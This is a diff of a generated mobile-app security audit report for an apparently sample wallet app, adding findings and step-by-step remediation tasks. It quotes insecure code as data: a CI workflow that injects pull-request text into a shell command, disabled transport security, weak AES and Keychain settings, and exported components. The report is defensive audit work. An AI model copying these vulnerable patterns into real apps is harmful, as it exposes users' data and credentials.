+**Fix:** Add Frida and Xposed signals (ports, loaded libraries, `/proc/self/maps`) to the set you report, and rely on attestation for the strong signal.
+
+**How to verify:** Attach Frida to a release build and confirm the signal reaches the backend.
+
+**Effort:** hours · **IDs:** MASWE-0065 · MASVS-RESILIENCE-4 · MASTG-BEST-0041 · MASTG-BEST-0048 · **Book:** [§14.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/05-resilience.md#144-detection-in-code)
+
+### 37. No root or jailbreak detection found
+
+- **Rule:** `XPL-021` · **Severity:** low · **Confidence:** Medium confidence (review it)
+- **Where:** `android/app/src/main/AndroidManifest.xml:4`
+  - No root or jailbreak detection (or attestation) found in the Android app.
+
+Matched line (masked):
+
+```text
+<application
+```
+
+**Why it matters:** A rooted or jailbroken device lets other code read the app's memory and storage and hook its checks. Without any signal, your backend can't weigh that risk for a payment or sign-in.
+
+**Fix:** Collect root and jailbreak signals, or better, attestation (Play Integrity, App Attest), and send them to the backend as risk signals. Report; don't block locally.
+
+**How to verify:** Run the app on a rooted emulator or a jailbroken device and confirm the backend receives the signal.
+
+**Effort:** days · **IDs:** MASWE-0051 · MASVS-RESILIENCE-1 · MASTG-TEST-0324 · MASTG-TEST-0240 · MASTG-BEST-0030 · **Book:** [§14.4](https://github.com/hossam9k/mobile-app-security/blob/main/book/05-resilience.md#144-detection-in-code)
+
+### 38. App has no way to force an update
+
+- **Rule:** `XPL-040` · **Severity:** low · **Confidence:** Medium confidence (review it)
+- **Where:** `android/app/src/main/AndroidManifest.xml:4`
+  - No way to force an update found in the Android app.
+
+Matched line (masked):
+
+```text
+<application
+```
+
+**Why it matters:** When a security bug ships, users on the old version stay exposed until they update. Without a forced update path, you can't retire a vulnerable version.
+
+**Fix:** Keep a server-side minimum version and enforce it with Play's in-app updates (`IMMEDIATE`) or an App Store redirect.
+
+**How to verify:** Raise the minimum version on the server and confirm an older build blocks sensitive features until the user updates.
+
+**Effort:** days · **IDs:** MASWE-0043 · MASVS-CODE-2 · MASTG-TEST-0392 · MASTG-TEST-0383 · **Book:** [§19.6](https://github.com/hossam9k/mobile-app-security/blob/main/book/07-platform-surfaces-and-new-frontiers.md#196-free-compiler-protections-and-platform-currency)
 
 ## Notes
 
@@ -909,7 +1210,37 @@ These checks ran and found nothing to fix.
 - Biometric key survives a new fingerprint or face (`AND-026`)
 - Code is loaded at runtime (`AND-031`)
 - Java deserialization with ObjectInputStream (`AND-032`)
-- App requests a sensitive permission (`AND-033`)
+- App requests sensitive permissions (`AND-033`)
+- Token or password stored in plain SharedPreferences or DataStore (`AND-034`)
+- Network security config allows plain HTTP for a domain (`AND-035`)
+- Backup rules don't keep sensitive data out of device-to-device transfer (`AND-036`)
+- Debug tool library ships in the release build (`AND-037`)
+- Release build turns on native debugging or is marked test-only (`AND-038`)
+- Timber logs everything in release builds (`AND-039`)
+- WebView Safe Browsing is turned off (`AND-040`)
+- Keystore key accepts caller-chosen IVs (`AND-041`)
+- App reads a hardware identifier (`AND-042`)
+- File name from another app is used as a path (Dirty Stream) (`AND-043`)
+- SafetyNet Attestation is still called (`AND-044`)
+- R8 keep rules undo obfuscation (`AND-047`)
+- Keystore key may both encrypt and sign (`AND-049`)
+- Crypto call names an explicit provider (`AND-050`)
+- Biometric prompt accepts weak (Class 2) biometrics (`AND-051`)
+- Biometric prompt doesn't require explicit confirmation (`AND-052`)
+- Screen-capture protection is switched off (`AND-053`)
+- Implicit Intent carries a token or password (`AND-054`)
+- App-internal action is sent as an implicit Intent (`AND-055`)
+- Receiver registered in code is exported (`AND-056`)
+- Content provider grants URI access to every path (`AND-057`)
+- Provider protects reads but not writes (`AND-058`)
+- WebView runs JavaScript with content access on (`AND-059`)
+- App writes to shared external storage (`AND-060`)
+- File is readable or writable by every app (`AND-061`)
+- StrictMode logging ships in release (`AND-062`)
+- Release build keeps native debug symbols (`AND-063`)
+- APK is signed with the v1 (JAR) scheme only (`AND-064`)
+- Serializable object read from an Intent (`AND-065`)
+- App requests fraud-relevant permissions (`AND-072`)
 
 **iOS**
 
@@ -928,6 +1259,23 @@ These checks ran and found nothing to fix.
 - Insecure NSKeyedUnarchiver API (`IOS-018`)
 - Secret copied to the general pasteboard without localOnly (`IOS-020`)
 - Release build keeps symbols or testability (`IOS-021`)
+- Debug tool pod or package ships in release builds (`IOS-022`)
+- Web view file-origin rules turned off through key-value coding (`IOS-023`)
+- Release entitlements let a debugger attach (`IOS-024`)
+- Release configuration compiles DEBUG-only code (`IOS-025`)
+- Advertising identifier read without App Tracking Transparency (`IOS-026`)
+- Required-reason API used without a declared reason (`IOS-027`)
+- LocalAuthentication accepts a recent unlock (`IOS-029`)
+- Web view can read a whole app container folder (`IOS-031`)
+- Deep link URL is loaded into a web view (`IOS-032`)
+- Network.framework connection allows TLS below 1.2 (`IOS-033`)
+- Sensitive files sit in a Documents folder the Files app shows (`IOS-034`)
+- Secret written to a file in the App Group container (`IOS-035`)
+- Bundled keyboard extension requests Full Access (`IOS-037`)
+- Entitlement has no matching feature in code (`IOS-039`)
+- Tracking domain isn't declared in the privacy manifest (`IOS-040`)
+- App Attest uses the development environment in a release build (`IOS-041`)
+- XML parser resolves external entities (`IOS-042`)
 
 **Cross-platform code**
 
@@ -936,10 +1284,36 @@ These checks ran and found nothing to fix.
 - Client or API secret is assigned a literal value (`XPL-003`)
 - AES-CBC needs a separate MAC to detect tampering (`XPL-005`)
 - Fixed IV or nonce (`XPL-006`)
-- MD5 or SHA-1 used (fine only as a non-security checksum) (`XPL-007`)
+- MD5 or SHA-1 used to protect a password, signature, or token (`XPL-007`)
 - Non-cryptographic or seeded random number generator (`XPL-008`)
 - Hardcoded plain-HTTP URL (`XPL-009`)
 - Token, password, or secret written to the log (`XPL-010`)
+- Encryption key is hardcoded in the app (`XPL-011`)
+- Secret copied to the clipboard without the sensitive flag (`XPL-012`)
+- Broken cipher (DES, 3DES, RC4, RC2, or Blowfish) (`XPL-013`)
+- Encryption key is too small (`XPL-014`)
+- PBKDF2 uses too few iterations (`XPL-015`)
+- Password hashing uses a fixed salt (`XPL-016`)
+- gRPC channel sends traffic in plain text (`XPL-017`)
+- Biometric check falls back to the device passcode (`XPL-018`)
+- Private key or client certificate ships inside the app (`XPL-019`)
+- Zip entry name is used as a path without a containment check (Zip Slip) (`XPL-020`)
+- RSA encryption uses PKCS \#1 v1.5 or no padding (`XPL-023`)
+- Signature uses SHA-1 or MD5 (`XPL-024`)
+- MAC or signature compared with an ordinary equality check (`XPL-025`)
+- Generated key is saved next to the data it protects (`XPL-026`)
+- SecRandomCopyBytes result is not checked (`XPL-027`)
+- Native code writes a secret into the WebView's DOM (`XPL-029`)
+- Embedded TLS library skips certificate checks or allows old TLS (`XPL-030`)
+- Local database stores credentials without encryption (`XPL-031`)
+- Notification shows a one-time code or a balance on the lock screen (`XPL-032`)
+- Password or PIN field shows the typed text (`XPL-033`)
+- Analytics SDK receives personal data (`XPL-034`)
+- Native code is built without compiler protections (`XPL-035`)
+- Staging, test, or private-network endpoint in release code (`XPL-036`)
+- OAuth sign-in uses a flow RFC 8252 rules out (`XPL-037`)
+- Jackson accepts attacker-chosen classes (`XPL-041`)
+- Shell command built from a variable (`XPL-042`)
 
 **CI/CD pipeline**
 
@@ -1021,18 +1395,7 @@ ref: ${{ github.event.pull_request.head.sha }}
 <certificates src="user" />
 ```
 
-### Task 6: Third-party action is pinned to a tag or branch, not a commit SHA (CI-001, high)
-
-- File: `.github/workflows/release.yml:8`
-- Change: Replace the tag with the full 40-character commit SHA and keep the version in a trailing comment. Let a tool such as `pinact run` write the pin, and let Dependabot (with a cooldown) keep it current.
-- Verify: Run `pinact run --check` or zizmor's `unpinned-uses` audit: every remote `uses:` should end in a 40-character SHA.
-- Current code (data, masked):
-
-```text
-- uses: actions/checkout@v4
-```
-
-### Task 7: Untrusted event text is pasted into a run script (CI-004, high)
+### Task 6: Untrusted event text is pasted into a run script (CI-004, high)
 
 - File: `.github/workflows/release.yml:11`
 - Change: Pass the value through `env:` and read it as a quoted shell variable, so it stays data.
@@ -1043,7 +1406,7 @@ ref: ${{ github.event.pull_request.head.sha }}
 - run: echo "Building ${{ github.event.pull_request.title }}"
 ```
 
-### Task 8: App Transport Security is turned off (IOS-001, high)
+### Task 7: App Transport Security is turned off (IOS-001, high)
 
 - File: `ios/AcmeWallet/Info.plist:9`
 - Change: Remove NSAllowsArbitraryLoads and NSAllowsArbitraryLoadsInWebContent from Info.plist (and any INFOPLIST_KEY_ build setting that adds them). If one host really needs HTTP, add a narrow NSExceptionDomains entry for that host only.
@@ -1054,7 +1417,7 @@ ref: ${{ github.event.pull_request.head.sha }}
 <key>NSAllowsArbitraryLoads</key>
 ```
 
-### Task 9: Keychain item is readable before the first unlock (IOS-008, high)
+### Task 8: Keychain item is readable before the first unlock (IOS-008, high)
 
 - File: `ios/AcmeWallet/TokenStore.swift:11`
 - Change: Use kSecAttrAccessibleWhenUnlockedThisDeviceOnly. If background work needs the item while the phone is locked, use kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly.
@@ -1065,7 +1428,7 @@ ref: ${{ github.event.pull_request.head.sha }}
 kSecAttrAccessible as String: kSecAttrAccessibleAlways,
 ```
 
-### Task 10: Exported component has no permission (AND-015, high)
+### Task 9: Exported component has no permission (AND-015, high)
 
 - File: `android/app/src/main/AndroidManifest.xml:14`
 - Change: Set `android:exported="false"` unless other apps must reach the component. If they must, require a permission with `android:protectionLevel="signature"` and validate every input.
@@ -1076,7 +1439,7 @@ kSecAttrAccessible as String: kSecAttrAccessibleAlways,
 <activity android:name=".TransferActivity" android:exported="true" />
 ```
 
-### Task 11: AES in ECB mode, or with no mode named (XPL-004, high)
+### Task 10: AES in ECB mode, or with no mode named (XPL-004, high)
 
 - File: `android/app/src/main/java/com/acme/wallet/WalletApi.kt:31`
 - Change: Use AES-GCM (`AES/GCM/NoPadding`) with a Keystore key, or Tink's AEAD, or CryptoKit's `AES.GCM` on iOS. Re-encrypt existing data under the new scheme.
@@ -1087,7 +1450,7 @@ kSecAttrAccessible as String: kSecAttrAccessibleAlways,
 fun encrypt(data: ByteArray): ByteArray = Cipher.getInstance("AES").doFinal(data)
 ```
 
-### Task 12: Biometric prompt is not tied to a key (AND-025, high)
+### Task 11: Biometric prompt is not tied to a key (AND-025, high)
 
 - File: `android/app/src/main/java/com/acme/wallet/WalletApi.kt:34`
 - Change: Pass a `CryptoObject` wrapping a Keystore key created with `setUserAuthenticationRequired(true)`, and do the protected work (sign or decrypt) with `result.cryptoObject` in the success callback.
@@ -1098,7 +1461,7 @@ fun encrypt(data: ByteArray): ByteArray = Cipher.getInstance("AES").doFinal(data
 prompt.authenticate(info)
 ```
 
-### Task 13: Biometric check only flips a boolean (IOS-012, high)
+### Task 12: Biometric check only flips a boolean (IOS-012, high)
 
 - File: `ios/AcmeWallet/TokenStore.swift:18`
 - Change: Bind the prompt to a key: create a Secure Enclave key with SecAccessControl [.privateKeyUsage, .biometryCurrentSet] and sign a server challenge with it. The server accepts the action only with a valid signature.
@@ -1109,7 +1472,7 @@ prompt.authenticate(info)
 LAContext().evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics,
 ```
 
-### Task 14: HTTP bodies are logged in every build (AND-030, medium)
+### Task 13: HTTP bodies are logged in every build (AND-030, medium)
 
 - File: `android/app/src/main/java/com/acme/wallet/WalletApi.kt:20`
 - Change: Use `Level.BODY` only when `BuildConfig.DEBUG` is true and `Level.NONE` otherwise, or add the interceptor only in debug builds.
@@ -1118,6 +1481,17 @@ LAContext().evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics,
 
 ```text
 .addInterceptor(HttpLoggingInterceptor().apply { level = HttpLoggingInterceptor.Level.BODY })
+```
+
+### Task 14: Action is pinned to a tag or branch, not a commit SHA (CI-001, medium)
+
+- File: `.github/workflows/release.yml:8`
+- Change: Replace the tag with the full 40-character commit SHA and keep the version in a trailing comment. Let a tool such as `pinact run` write the pin, and let Dependabot (with a cooldown) keep it current. Reference this repository's own actions as `./…` or `$/…`.
+- Verify: Run `pinact run --check` or zizmor's `unpinned-uses` audit: every remote `uses:` in workflows and composite `action.yml` files should end in a 40-character SHA.
+- Current code (data, masked):
+
+```text
+- uses: actions/checkout@v4
 ```
 
 ### Task 15: Workflow token permissions are not restricted (CI-002, medium)
@@ -1134,7 +1508,7 @@ jobs:
 ### Task 16: actions/checkout leaves the job token on disk (CI-005, medium)
 
 - File: `.github/workflows/release.yml:8`
-- Change: Set `persist-credentials: false` on every checkout. Only a job that pushes back to the repository needs the token, and it can pass it explicitly to that one command.
+- Change: Set `persist-credentials: false` on every checkout. Only a job that pushes back to the repository needs the token: set `persist-credentials: true` there on purpose, or pass the token to that one command.
 - Verify: In a test run, add a step `git config --get-regexp 'http.*extraheader'`; it should print nothing. zizmor's `artipacked` audit also flags checkouts that keep credentials.
 - Current code (data, masked):
 
@@ -1142,7 +1516,18 @@ jobs:
 - uses: actions/checkout@v4
 ```
 
-### Task 17: App Link is not verified (AND-019, medium)
+### Task 17: Protected resource used without a usable purpose string (IOS-038, medium)
+
+- File: `ios/AcmeWallet/TokenStore.swift:18`
+- Change: Add the Info.plist usage key with a specific sentence that names the feature, such as "Scan a check to deposit it."
+- Verify: Reset privacy settings, trigger the feature, and confirm the prompt shows your specific explanation.
+- Current code (data, masked):
+
+```text
+LAContext().evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics,
+```
+
+### Task 18: App Link is not verified (AND-019, medium)
 
 - File: `android/app/src/main/AndroidManifest.xml:16`
 - Change: Add `android:autoVerify="true"` to the `https` intent filter and host `/.well-known/assetlinks.json` with your app signing certificate fingerprint.
@@ -1153,7 +1538,7 @@ jobs:
 <intent-filter>
 ```
 
-### Task 18: Backup is on with no exclusion rules (AND-021, medium)
+### Task 19: Backup is on with no exclusion rules (AND-021, medium)
 
 - File: `android/app/src/main/AndroidManifest.xml:4`
 - Change: Add `android:dataExtractionRules` (Android 12+) and `android:fullBackupContent` (Android 11 and lower) that exclude secrets and their keysets, in both `<cloud-backup>` and `<device-transfer>`.
@@ -1164,7 +1549,7 @@ jobs:
 <application
 ```
 
-### Task 19: R8 is off in the release build (AND-027, medium)
+### Task 20: R8 is off in the release build (AND-027, medium)
 
 - File: `android/app/build.gradle.kts:16`
 - Change: Set `isMinifyEnabled = true` and `isShrinkResources = true` in the `release` build type, with `proguard-android-optimize.txt`. Keep only the keep rules reflection needs.
@@ -1175,7 +1560,29 @@ jobs:
 isMinifyEnabled = false
 ```
 
-### Task 20: Token or password stored in UserDefaults (IOS-011, medium)
+### Task 21: App never blocks screenshots or the recents thumbnail (AND-045, medium)
+
+- File: `android/app/src/main/AndroidManifest.xml:4`
+- Change: Set `FLAG_SECURE` on screens that show account data or codes, and `SecureFlagPolicy.SecureOn` on Compose dialogs that show secrets.
+- Verify: Open a sensitive screen, take a screenshot and open the recents screen; confirm both show a blank or blocked view.
+- Current code (data, masked):
+
+```text
+<application
+```
+
+### Task 22: App has no overlay (tapjacking) protection (AND-046, medium)
+
+- File: `android/app/src/main/AndroidManifest.xml:4`
+- Change: On sensitive screens, call `window.setHideOverlayWindows(true)` (API 31+, with the `HIDE_OVERLAY_WINDOWS` permission) and set `filterTouchesWhenObscured` on confirm and pay buttons.
+- Verify: Run a test app that draws a partial overlay over the confirm button and confirm the tap is ignored or the overlay is hidden.
+- Current code (data, masked):
+
+```text
+<application
+```
+
+### Task 23: Token or password stored in UserDefaults (IOS-011, medium)
 
 - File: `ios/AcmeWallet/TokenStore.swift:14`
 - Change: Keep short-lived tokens in memory. Store long-lived tokens and credentials in the Keychain with kSecAttrAccessibleWhenUnlockedThisDeviceOnly. Leave only non-secret settings in UserDefaults.
@@ -1186,7 +1593,13 @@ isMinifyEnabled = false
 UserDefaults.standard.set(token, forKey: "authToken")
 ```
 
-### Task 21: No certificate pinning (needed for high-risk apps) (AND-007, medium)
+### Task 24: App never hides its screen in the app switcher or recordings (IOS-030, medium)
+
+- File: `ios/AcmeWallet/Info.plist`
+- Change: Cover sensitive views in sceneWillResignActive and remove the cover in sceneDidBecomeActive, and watch sceneCaptureState (iOS 17+) to hide content while the screen is recorded.
+- Verify: Open a sensitive screen, swipe to the app switcher, and confirm the snapshot shows the cover; start a screen recording and confirm the content is hidden.
+
+### Task 25: No certificate pinning (needed for high-risk apps) (AND-007, medium)
 
 - File: `android/app/src/main/AndroidManifest.xml:4`
 - Change: Pin the SPKI of your CA's intermediate in `network_security_config.xml`, with a backup pin at a second CA and an expiration date. Write a rotation runbook before you ship it. Pin only if you can also run failure alerts, CT monitoring, and a protected kill switch (§8.7); if not, don't pin and rely on strict TLS plus CT (§8.9).
@@ -1197,7 +1610,7 @@ UserDefaults.standard.set(token, forKey: "authToken")
 <application
 ```
 
-### Task 22: Deprecated EncryptedSharedPreferences (Jetpack Security) (AND-022, medium)
+### Task 26: Deprecated EncryptedSharedPreferences (Jetpack Security) (AND-022, medium)
 
 - File: `android/app/build.gradle.kts:23`
 - Change: If the stored values aren't secrets (flags, UI state), move them to plain DataStore or SharedPreferences: the sandbox already protects them (§6.4). For tokens and credentials, use DataStore, Tink, and an Android Keystore master key (`androidx.datastore:datastore-tink`). Migrate with `SharedPreferencesMigration`, then delete the old file and Keystore alias.
@@ -1208,7 +1621,7 @@ UserDefaults.standard.set(token, forKey: "authToken")
 implementation("androidx.security:security-crypto:1.1.0")
 ```
 
-### Task 23: Deprecated EncryptedSharedPreferences (Jetpack Security) (AND-022, medium)
+### Task 27: Deprecated EncryptedSharedPreferences (Jetpack Security) (AND-022, medium)
 
 - File: `android/app/src/main/java/com/acme/wallet/WalletApi.kt:9`
 - Change: If the stored values aren't secrets (flags, UI state), move them to plain DataStore or SharedPreferences: the sandbox already protects them (§6.4). For tokens and credentials, use DataStore, Tink, and an Android Keystore master key (`androidx.datastore:datastore-tink`). Migrate with `SharedPreferencesMigration`, then delete the old file and Keystore alias.
@@ -1219,7 +1632,7 @@ implementation("androidx.security:security-crypto:1.1.0")
 import androidx.security.crypto.EncryptedSharedPreferences
 ```
 
-### Task 24: targetSdk is below Google Play's requirement (AND-028, medium)
+### Task 28: targetSdk is below Google Play's requirement (AND-028, medium)
 
 - File: `android/app/build.gradle.kts:12`
 - Change: Raise `targetSdk` to 36 or later, then test the behavior changes for each version you skipped.
@@ -1230,13 +1643,36 @@ import androidx.security.crypto.EncryptedSharedPreferences
 targetSdk = 34
 ```
 
-### Task 25: No certificate pinning (needed for high-risk apps) (IOS-007, medium)
+### Task 29: Play Integrity is not integrated (AND-048, medium)
+
+- File: `android/app/src/main/AndroidManifest.xml:4`
+- Change: Request a standard Play Integrity token for sensitive actions and decide on the server (§9.3, §12.2).
+- Verify: Send a sensitive request from a re-signed build and confirm the server rejects it or lowers its trust score.
+- Current code (data, masked):
+
+```text
+<application
+```
+
+### Task 30: No certificate pinning (needed for high-risk apps) (IOS-007, medium)
 
 - File: `ios/AcmeWallet/Info.plist`
 - Change: Pin the SPKI of your intermediate CA with NSPinnedDomains (simplest) or a URLSessionDelegate that validates first, plus a backup pin and a written rotation runbook. Pin only if you can also run failure alerts, CT monitoring, and a protected kill switch (§8.7); if not, don't pin and rely on strict TLS plus CT (§8.9).
 - Verify: Make the device trust a proxy CA, then confirm requests to pinned hosts fail while an unpinned host still loads through the proxy (§8.10, step 1).
 
-### Task 26: minSdk is below 24 (AND-029, low)
+### Task 31: App Attest isn't integrated (IOS-028, medium)
+
+- File: `ios/AcmeWallet/Info.plist`
+- Change: Generate and attest a key once per install with DCAppAttestService, send an assertion with sensitive requests, and verify both on the server.
+- Verify: Call a sensitive endpoint with curl using a valid session and confirm the server rejects it for a missing or invalid assertion.
+
+### Task 32: App doesn't refuse third-party keyboards (IOS-036, low)
+
+- File: `ios/AcmeWallet/Info.plist`
+- Change: Implement application(_:shouldAllowExtensionPointIdentifier:) and return false for .keyboard.
+- Verify: Install a third-party keyboard, open the app, and confirm only the system keyboard appears in every field.
+
+### Task 33: minSdk is below 24 (AND-029, low)
 
 - File: `android/app/build.gradle.kts:11`
 - Change: Raise `minSdk` to at least 24. Android ignores the network security config below API 24, so it can't protect those devices. If you must support them, use a TrustManager that trusts only system CAs (or OkHttp `CertificatePinner` in a high-risk app), or accept the risk for those users.
@@ -1247,6 +1683,72 @@ targetSdk = 34
 minSdk = 23
 ```
 
+### Task 34: No debugger detection found (XPL-022, low)
+
+- File: `android/app/src/main/AndroidManifest.xml:4`
+- Change: Add JDWP and TracerPid checks on Android, and the `sysctl` P_TRACED check on iOS, to the signals you report, and run them during sensitive flows, not only at startup.
+- Verify: Attach a debugger to a release build and confirm the signal reaches the backend.
+- Current code (data, masked):
+
+```text
+<application
+```
+
+### Task 35: App never checks that the device has a screen lock (XPL-028, low)
+
+- File: `android/app/src/main/AndroidManifest.xml:4`
+- Change: Bind secrets to keys that need a screen lock (`setUserAuthenticationRequired`, `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly`), and check `isDeviceSecure` or `canEvaluatePolicy`.
+- Verify: Remove the screen lock on a test device and confirm the app warns the user or refuses the sensitive feature.
+- Current code (data, masked):
+
+```text
+<application
+```
+
+### Task 36: No emulator detection found (XPL-038, low)
+
+- File: `android/app/src/main/AndroidManifest.xml:4`
+- Change: Add emulator signals (build fingerprint, hardware, `ro.kernel.qemu`; the iOS simulator environment) to the set you report, and rely on attestation for the strong signal.
+- Verify: Run a release build on an emulator and confirm the signal reaches the backend.
+- Current code (data, masked):
+
+```text
+<application
+```
+
+### Task 37: No hooking or instrumentation detection found (XPL-039, low)
+
+- File: `android/app/src/main/AndroidManifest.xml:4`
+- Change: Add Frida and Xposed signals (ports, loaded libraries, `/proc/self/maps`) to the set you report, and rely on attestation for the strong signal.
+- Verify: Attach Frida to a release build and confirm the signal reaches the backend.
+- Current code (data, masked):
+
+```text
+<application
+```
+
+### Task 38: No root or jailbreak detection found (XPL-021, low)
+
+- File: `android/app/src/main/AndroidManifest.xml:4`
+- Change: Collect root and jailbreak signals, or better, attestation (Play Integrity, App Attest), and send them to the backend as risk signals. Report; don't block locally.
+- Verify: Run the app on a rooted emulator or a jailbroken device and confirm the backend receives the signal.
+- Current code (data, masked):
+
+```text
+<application
+```
+
+### Task 39: App has no way to force an update (XPL-040, low)
+
+- File: `android/app/src/main/AndroidManifest.xml:4`
+- Change: Keep a server-side minimum version and enforce it with Play's in-app updates (`IMMEDIATE`) or an App Store redirect.
+- Verify: Raise the minimum version on the server and confirm an older build blocks sensitive features until the user updates.
+- Current code (data, masked):
+
+```text
+<application
+```
+
 ---
 
-Generated by masaudit v0.3.0 — https://github.com/hossam9k/masaudit
+Generated by masaudit v0.4.0 — https://github.com/hossam9k/masaudit
